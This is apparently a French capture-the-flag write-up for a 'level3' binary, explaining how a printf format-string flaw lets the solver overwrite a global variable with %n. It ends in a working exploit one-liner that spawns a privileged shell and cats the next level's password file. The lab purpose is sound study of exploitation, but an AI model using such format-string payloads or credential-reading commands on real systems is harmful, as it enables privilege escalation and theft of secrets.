level3:
On voit un binaire, on l'ouvre avec un outil de reverse-engineering, on voit qu'il fait appel a la fonction v qui ouvre un shell admin si un int correspond a la bonne valeur (64)
On ouvre gdb, on disass la fonction v(), on met un breakpoint juste avant la comparaison (cmp 0x080484df) sur le mov (b *0x080484da). On lance avec r, une fois arrive au breakpoint on fait stepi, puis set $eax=64, puis c. On entre dans le shell admin et on peut cat le password

PLOT TWIST:
gdb doit être lancé en root pour que ça ouvre un shell admin sinon ça serait un peu facile niveau sécurité haha oups; donc non.

On voit que la comparaison est faite par rapport à une variable globale m qui se trouve à l'adresse 0x0804988c (`info variables` dans gdb ou bien `disass v` et les lignes `0x080484da <+54>:    mov    0x804988c,%eax` `0x080484df <+59>:    cmp    $0x40,%eax`). Si on arrive à override ce qui se trouve à cet endroit on pourra accéder au shell admin pour de vrai.

On a fgets qui prend un input mais qui contrairement a gets est sécurisé et empêche les buffer overflow. Par contre printf est vulnérable aux Format string attack https://owasp.org/www-community/attacks/Format_string_attack. On peut utiliser le flag %n, qui écrit le nombre de caractères jusque-là par printf sur une adresse de la stack. Par défaut, %n prend l'adresse la plus "récente", mais on peut remonter en utilisant le format `%<num>$n`.

Par exemple en lancant ./level3 avec %p %p on obtient
0x200 0xb7fd1ac0
Donc si on lance ./level 3 avec AAAA%n on va écrire 4 (nous avons écrit 4 A) à l'adresse 0x200. Avec AAAA%2$n on va écrire 4 à l'adresse 0xb7fd1ac0, et ainsi de suite...

En utilisant AAAA et une dizaine de %p, on voit que les 4141 apparaissent a partir du 4ème %p. Donc on peut écrire l'adresse de la variable m en début de string, faire pointer %n sur le 4ème emplacement, ce qui nous permettra d'écrire une valeur sur m pour accéder au shell admin :
\x8c\x98\x04\x08%4$n va écrire 4 à l'adresse de m (0x0804988c).

Donc pour écrire 64, il suffit de rajouter 60 caractères après l'adresse:

(python -c "print '\x8c\x98\x04\x08' + 'A' * 60 +  '%4\$n'"; echo 'cat /home/user/level4/.pass') | ./level3
